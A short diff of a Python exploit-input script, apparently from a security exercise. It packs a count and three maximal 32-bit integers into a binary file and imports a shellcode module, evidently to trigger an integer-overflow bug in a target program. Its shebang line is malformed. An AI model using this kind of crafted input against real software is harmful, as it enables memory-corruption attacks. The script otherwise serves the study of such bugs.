@@ -1,7 +1,16 @@
 #!/user/bin/bash/python
 
-count = 3
-ints = [6, 6, 6]
+from struct import pack
+from shellcode import shellcode
 
-out = str(bin(count)[2:].zfill(32)) + " " + " ".join([str(bin(x)[2:].zfill(32)) for x in ints])
-print out
+count = 3
+ints = [4294967295, 4294967295, 4294967295]
+
+out = ""
+out += pack("<I", count)
+for i in ints:
+    out += pack("<I", i)
+
+f = open("tmp", "wb")
+f.write(out)
+f.close()
